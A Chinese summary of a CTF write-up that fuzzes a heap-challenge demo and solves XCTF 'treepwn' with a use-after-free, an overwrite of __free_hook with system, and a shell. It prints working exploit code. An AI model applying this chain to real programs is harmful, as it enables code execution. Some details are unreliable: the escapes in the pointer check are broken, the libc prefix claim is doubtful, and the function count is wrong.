---
title: 【ACTF2022】从 Fuzz 到 XCTF 赛题
contest: ACTF
year: 2022
difficulty: medium
vuln_type: heap_exploit
tags: [Fuzz, randint-random-op, demo-ptmalloc2, fmt-string, key_free-arbitrary-free, write_in-arbitrary-write, 2D-coord-tree]
attack_chain: 堆题 Fuzz demo（add/delet/edit/show/leak/key_free/write_in/exit 7 个功能）/Fuzz 脚本 0x1000 轮每 10 轮 add 每 2 轮 delet 每 3 轮 show 检查 x55/x56 指针前缀/XCTF 赛题 treepwn 2D 坐标二叉树 add/edit/delet/show/query/批量 delet(i,j) 9x9 触发后 add(66,66,'nameless') + delet(3,6) + edit(3,6,p64(free_hook)) + add(3,6,'/bin/sh\x00') + add(6,6,p64(system)) + delet(3,6) 收壳
key_payload: 9x9 批量 delet + add(66,66,'nameless') 触发 nameless 链表 → UAF → __free_hook=system
one_liner: ACTF 2022 Nameless_a 经验分享，从 Fuzz demo 入门到 XCTF treepwn 实战的二维坐标 UAF。
lesson: Fuzz 是发现 heap 漏洞模式的有效手段；randint 随机操作 + 检查残留指针前缀可快速发现 UAF；2D 坐标二叉树用 (x,y) 双重索引，批量删除后存在悬挂指针触发 UAF。
quality: high
---

# 【ACTF2022】从 Fuzz 到 XCTF 赛题

## 概览
Nameless_a 看雪论坛分享：从堆题 Fuzz demo 入门到 XCTF treepwn 实战。

## 一、前言
- 介绍 Fuzz 在 CTF 堆题中的作用

## 二、什么是 Fuzz
- 介绍 Fuzz 概念
- 简单程序的随机操作发现漏洞模式

## 三、堆题 Fuzz demo
- 7 个功能：add / delet / edit / show / leak / key_free / write_in / exit
- 漏洞：
  - leak: `printf(buf)` fmt 字符串漏洞
  - key_free: `free((char*)p[0])` 任意地址 free
  - write_in: 任意地址写
- Fuzz 脚本：随机 add/delet/show 0x1000 轮
  ```python
  for i in range(0, 0x1000):
      if i % 10 == 0:
          idx = randint(0, 0x10)
          add(idx, 0x20)
      elif i % 2 == 0:
          idx = randint(0, 0x10)
          delet(idx)
      elif i % 3 == 0:
          idx = randint(0, 0x10)
          show(idx)
          check_char = r.recv(1)
          if check_char in ('x55', 'x56'):  # 残留 libc/heap 指针
              f.write('show({})'.format(idx))
              break
  ```

## 四、XCTF treepwn 题解
- 二维坐标 (x, y) 二叉树数据结构
- 功能：add(x, y, name) / edit / delet / show / query(a,b,c,d)
- 9x9 网格批量删除触发 nameless 链 + UAF
- 攻击链：
  ```python
  # 批量删除 9x9 = 81 个
  for i in range(0, 9):
      for j in range(0, 9):
          delet(i, j)
  # 触发 nameless 链
  add(66, 66, 'nameless')
  delet(3, 6)
  # 改 __free_hook
  edit(3, 6, p64(free_hook))
  add(3, 6, '/bin/sh\x00')
  add(6, 6, p64(system))
  delet(3, 6)  # system('/bin/sh')
  ```

## 经验提炼
- Fuzz 是发现 heap 漏洞模式的有效手段（自动随机操作 + 检查残留指针）
- 残留指针前缀 `\x55\x55` (heap) / `\x56\x56` (libc) 是判断 UAF 的标志
- 任意地址 free (key_free) + 任意地址写 (write_in) 是 demo 中"理想化"漏洞
- 二维坐标数据结构用 (x, y) 双重索引，批量删除 9x9 后触发 nameless 链
- nameless 是 CTF 选手常用的"无主链表"名称
- __free_hook = system + delet 触发 free 任意 chunk = 收 shell
